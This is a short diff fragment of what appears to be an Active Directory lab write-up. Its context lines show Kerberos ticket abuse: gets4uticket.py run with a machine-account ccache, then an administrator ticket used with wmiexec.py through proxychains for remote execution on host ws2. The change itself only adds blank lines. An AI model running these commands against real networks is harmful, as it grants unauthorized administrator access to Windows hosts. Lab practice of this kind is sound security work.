@@ -30,3 +30,5 @@ proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@d
 export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
 proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
 ```
+
+
